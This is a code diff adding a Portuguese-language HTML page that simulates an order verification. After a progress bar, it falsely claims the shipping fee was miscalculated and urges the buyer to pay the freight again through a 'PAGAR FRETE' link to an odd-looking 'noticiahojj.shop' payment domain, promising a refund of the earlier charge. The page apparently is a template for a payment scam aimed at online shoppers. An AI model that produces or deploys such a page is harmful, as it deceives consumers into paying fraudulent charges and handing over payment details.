@@ -1,0 +1,65 @@
+<!DOCTYPE html><html lang="pt-BR"><head> 
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificação de Pedido</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/styles.css">
+</head>
+<body>
+    <!-- Seção do topo -->
+    <div class="top-bar">
+    </div>
+    <!-- Seção de verificação do pedido -->
+    <div id="verification-section" class="full-screen-section">
+        <div class="verification-content">
+            <div class="success-icon">
+                <div class="checkmark">✓</div>
+            </div>
+            <h1>Seu pedido foi concluído!</h1>
+            <p>Aguarde enquanto realizamos a verificação do pedido...</p>
+            <!-- Barra de progresso animada -->
+            <div class="progress-bar">
+                <div class="progress" id="progress"></div>
+            </div>
+            <div class="status-text">Processando...</div>
+        </div>
+    </div>
+    <!-- Seção após a verificação -->
+    <div id="error-section" class="full-screen-section hidden">
+        <!-- Box separadas que aparecem uma abaixo da outra -->
+        <div class="box-stage hidden" id="box-1">
+            <div class="status-icon success">
+                <span class="icon">✓</span>
+            </div>
+            <h3>Pedido Concluído com Sucesso</h3>
+            <p>Aguarde um momento...</p>
+        </div>
+        <div class="box-stage hidden" id="box-2">
+            <div class="status-icon warning">
+                <span class="icon">⚠</span>
+            </div>
+            <h3>Validação do CEP para Entrega</h3>
+            <p>Estamos verificando as informações...</p>
+        </div>
+        <div class="box-stage hidden" id="box-3">
+            <div class="status-icon error">
+                <span class="icon">✕</span>
+            </div>
+            <h3>O valor do Frete foi calculado errado para sua região</h3>
+            <p>O pedido não será enviado. Faça a correção do pagamento do frete para que seu pedido seja enviado.</p>
+            <a href="https://pay.noticiahojj.shop/691fc775c06fe2bfe8ce5bab" id="retry-button" class="retry-button">
+                <span class="button-icon">💳</span>
+                PAGAR FRETE
+            </a>
+            <div class="refund-notice">
+                <small>O valor pago do frete anterior será reembolsado</small>
+            </div>
+        </div>
+    </div>
+    <script src="js/script.js"></script>
+
+
+
+</body></html>
